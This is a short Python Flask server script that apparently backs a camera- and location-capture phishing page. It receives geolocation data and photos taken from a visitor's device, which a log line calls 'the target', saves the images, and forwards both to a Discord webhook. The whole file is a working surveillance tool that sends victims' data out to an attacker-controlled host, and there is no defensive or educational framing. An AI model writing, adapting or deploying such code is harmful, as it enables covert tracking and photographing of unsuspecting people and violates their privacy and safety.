#!/usr/bin/env python3
import os
import json
import requests
from flask import Flask, request, Response
import time

# Environment variables setup
TARGET_URL = os.getenv('TARGET_URL', 'http://localhost:8000/image')
PORT = int(os.getenv('PORT', '8000'))
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', '')

app = Flask(__name__)

if not os.path.exists('image'):
    print(f"Creating image directory at {os.getcwd()}/image")
    os.mkdir('image')
PATH_TO_IMAGES_DIR = os.path.join(os.getcwd(), 'image')

@app.route("/", methods=["GET"])
def get_website():
    # Simplified to serve a static HTML file, ensure 'index.html' is in your working directory
    return app.send_static_file('index.html')

@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    if DISCORD_WEBHOOK_URL:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(DISCORD_WEBHOOK_URL, headers=headers, json=data)
        print(response.text)  # For debugging
    return "OK"

@app.route('/image', methods=['POST'])
def image():
    img_file = request.files['image']
    filename = f'{time.strftime("%Y%m%d-%H%M%S")}.jpeg'
    img_file.save(os.path.join(PATH_TO_IMAGES_DIR, filename))
    print(f"Picture of the target captured and saved as {filename}")

    if DISCORD_WEBHOOK_URL:
        files = {'image': open(os.path.join(PATH_TO_IMAGES_DIR, filename), 'rb')}
        requests.post(DISCORD_WEBHOOK_URL, files=files)
    return Response(f"{filename} saved and potentially sent to Discord webhook")

def main():
    app.run(debug=False, host="0.0.0.0", port=PORT)

if __name__ == "__main__":
    main()